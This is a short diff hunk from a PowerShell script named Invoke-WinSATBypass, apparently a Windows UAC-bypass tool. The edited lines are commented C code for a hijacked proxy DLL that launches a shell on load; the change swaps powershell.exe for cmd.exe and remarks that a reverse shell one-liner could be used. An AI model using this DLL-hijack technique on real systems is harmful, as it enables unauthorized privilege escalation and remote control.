@@ -19,7 +19,7 @@ function Invoke-WinSATBypass
     # {
     #    switch ( reason ) {
     #    case DLL_PROCESS_ATTACH:
-	#	     WinExec("powershell.exe",1); # Could also be a reverse shell one-liner
+    #	     WinExec("cmd.exe",1); # Could also be a Powershell reverse shell one-liner
     #        DisableThreadLibraryCalls(instance);
     #        return prx_attach(instance);
     #    case DLL_PROCESS_DETACH:
